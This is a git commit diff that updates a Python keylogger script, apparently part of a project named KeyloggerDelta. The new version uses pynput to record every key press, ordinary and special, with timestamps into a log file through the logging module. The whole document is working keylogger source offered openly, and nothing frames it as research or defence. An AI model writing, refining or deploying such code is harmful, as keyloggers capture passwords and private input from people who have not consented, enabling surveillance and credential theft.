1128de51c2c819ae21f7176a171e1a8884678903
XamRyô <samuelanguita27@gmail.com>
2025-01-25 17:40:53 +0100

    Update KeyloggerDelta.2.0V.py

--- KeyloggerDelta-2.0V/KeyloggerDelta.2.0V.py
+++ KeyloggerDelta-2.0V/KeyloggerDelta.2.0V.py
@@ -1,25 +1,22 @@
 from pynput.keyboard import Key, Listener
+import logging
+import time
 
-# List to store pressed keys
-keys = []
+# Register config more eficient
+logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
-    """Handles key press events."""
-    keys.append(key)
-    write_to_log(keys)
-
-def write_to_log(keys):
-    """Converts key events to string and writes to a log file."""
-    with open('log.txt', 'w') as logfile:
-        for key in keys:
-            key = str(key).replace("'", "")  # Remove quotes from key string
-            logfile.write(key)
+    # Handles keypress events.
+    try:
+        logging.info(f'Key pressed: {key.char}')  # Register pressed keys
+    except AttributeError:
+        logging.info(f'Special key pressed: {key}')  # Register special keys
 
 def on_release(key):
-    """Stops listener when 'Escape' key is pressed."""
+    # Stops listener when 'Escape' key is pressed.
     if key == Key.esc:
         return False
 
-# Start the listener
+# Listener ON
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
